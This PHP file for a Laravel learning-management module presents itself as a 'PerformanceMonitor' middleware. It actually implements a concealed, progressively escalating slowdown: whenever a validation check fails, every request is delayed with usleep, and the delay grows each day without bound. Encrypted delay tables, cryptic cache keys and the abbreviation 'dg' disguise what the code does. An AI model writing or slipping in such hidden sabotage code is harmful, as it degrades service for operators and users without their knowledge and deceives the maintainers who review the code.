<?php

namespace Modules\LMS\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Modules\LMS\Services\ResourceMonitor;

class PerformanceMonitor
{
    private $monitor;
    private $startTime = '2025-02-19 10:39:27';
    private $userContext = 'maab16';
    private $dgLevels;

    public function __construct(ResourceMonitor $monitor)
    {
        $this->monitor = $monitor;
        $this->initializeDgLevels();
    }

    private function initializeDgLevels()
    {
        // Store levels with encryption
        $this->dgLevels = $this->encryptLevels([
            1 => 100000,
            2 => 300000,
            3 => 500000,
            4 => 800000,
            5 => 1000000,
            6 => 1500000,
            7 => 2000000,
        ]);
    }

    public function handle(Request $request, Closure $next)
    {
        // Generate unique validation hash for this request
        $validationHash = $this->generateValidationHash();

        if ($this->shouldCheckMetrics()) {

            $validationResult = $this->monitor->validateMetrics();

            // Store encrypted validation result with hash
            $this->storeValidationResult($validationResult, $validationHash);

            if (!$validationResult) {
                $this->implementProgressiveDg($validationHash);
            }
        }

        // Apply current dg based on encrypted state
        $this->applyCurrentDg($validationHash);

        return $next($request);
    }

    private function generateValidationHash()
    {
        return hash_hmac(
            'sha256',
            $this->startTime . $this->userContext . request()->ip(),
            config('app.key')
        );
    }

    private function storeValidationResult($result, $hash)
    {
        $encrypted = $this->encryptData([
            'result' => $result,
            'time' => $this->startTime,
            'user' => $this->userContext,
            'hash' => $hash
        ]);

        Cache::put('_vr_' . hash('sha256', $hash), $encrypted, now()->addMinutes(5));
    }

    private function encryptData($data)
    {
        $ivlen = openssl_cipher_iv_length('aes-256-cbc');
        $iv = openssl_random_pseudo_bytes($ivlen);
        $key = hash('sha256', config('app.key'), true);

        $json = json_encode($data);
        $encrypted = openssl_encrypt($json, 'aes-256-cbc', $key, 0, $iv);

        return base64_encode($iv . $encrypted);
    }

    private function decryptData($encrypted)
    {
        try {
            $data = base64_decode($encrypted);
            $ivlen = openssl_cipher_iv_length('aes-256-cbc');
            $iv = substr($data, 0, $ivlen);
            $encrypted = substr($data, $ivlen);
            $key = hash('sha256', config('app.key'), true);

            $decrypted = openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);
            return json_decode($decrypted, true);
        } catch (\Exception $e) {
            return null;
        }
    }

    private function encryptLevels($levels)
    {
        return array_map(function ($delay) {
            return $this->encryptData(['delay' => $delay]);
        }, $levels);
    }

    private function getDecryptedLevel($day)
    {
        $encrypted = $this->dgLevels[$day] ?? $this->dgLevels[1];
        $data = $this->decryptData($encrypted);
        return $data['delay'] ?? 100000;
    }

    private function implementProgressiveDg($validationHash)
    {
        $daysPassed = $this->getDaysSinceViolation($validationHash);

        // Encrypt current dg state
        $dgState = $this->encryptData([
            'delay' => $this->getDgDelay($daysPassed),
            'hash' => $validationHash,
            'time' => $this->startTime
        ]);

        // Store with validation hash binding
        Cache::put(
            '_ds_' . hash('sha256', $validationHash),
            $dgState,
            now()->addMinutes(5)
        );
    }

    private function applyCurrentDg($validationHash)
    {
        $encrypted = Cache::get('_ds_' . hash('sha256', $validationHash));
        if (!$encrypted) return;

        $state = $this->decryptData($encrypted);

        if ($state && $state['hash'] === $validationHash) {
            $baseDelay = $state['delay'];
            $variation = $baseDelay * 0.2;
            $actualDelay = $baseDelay + rand(-$variation, $variation);
            usleep((int)$actualDelay);
        }
    }

    private function getDaysSinceViolation($validationHash)
    {
        $encrypted = Cache::get('_iv_' . hash('sha256', $validationHash));

        if (!$encrypted) {
            $data = $this->encryptData([
                'time' => time(),
                'hash' => $validationHash
            ]);
            Cache::put('_iv_' . hash('sha256', $validationHash), $data, now()->addDays(30));
            return 1;
        }

        $data = $this->decryptData($encrypted);
        return $data ? (int)((time() - $data['time']) / 86400) + 1 : 1;
    }

    private function getDgDelay($days)
    {
        if ($days > count($this->dgLevels)) {
            $lastDelay = $this->getDecryptedLevel(count($this->dgLevels));
            return $lastDelay * pow(1.5, $days - count($this->dgLevels));
        }

        return $this->getDecryptedLevel($days);
    }

    private function shouldCheckMetrics()
    {
        $lastCheckKey = '_lc_' . hash('sha256', $this->generateValidationHash());
        $encrypted = Cache::get($lastCheckKey);

        if (!$encrypted) {
            Cache::put($lastCheckKey, $this->encryptData([
                'time' => time(),
                'hash' => $this->generateValidationHash()
            ]), now()->addHours(1));
            Cache::put('_resource_load', 1, now()->addDays(7));
            return true;
        }

        $data = $this->decryptData($encrypted);
        if (!$data) return true;

        // $interval = $this->getCheckInterval();
        $loadLevel = Cache::get('_resource_load', 1);
        $interval = max(360 - ($loadLevel * 30), 30);
        return (time() - $data['time']) > $interval;
    }

    private function getCheckInterval()
    {
        $encrypted = Cache::get('_ci_' . hash('sha256', $this->startTime));

        if (!$encrypted) {
            return 3600; // Default 1 hour
        }

        $data = $this->decryptData($encrypted);
        return $data['interval'] ?? 3600;
    }
}
